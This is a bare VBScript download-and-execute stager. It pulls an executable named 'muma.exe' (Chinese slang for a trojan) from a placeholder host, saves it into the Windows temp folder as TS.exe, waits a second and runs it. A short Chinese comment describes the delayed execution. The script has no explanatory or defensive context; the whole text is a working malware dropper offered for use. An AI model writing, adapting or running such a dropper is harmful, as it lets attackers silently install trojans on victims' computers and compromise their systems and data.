Set Post = CreateObject("Msxml2.XMLHTTP")
Set Shell = CreateObject("Wscript.Shell")
Post.Open "GET","http://www.xxx.com/muma.exe",0
Post.Send()
Set aGet = CreateObject("ADODB.Stream")
aGet.Mode = 3
aGet.Type = 1
aGet.Open() 
aGet.Write(Post.responseBody)
aGet.SaveToFile "c:\windows\temp\TS.exe",2
wscript.sleep 1000 
Shell.Run ("c:\windows\temp\TS.exe") '延迟过后执行下载文件
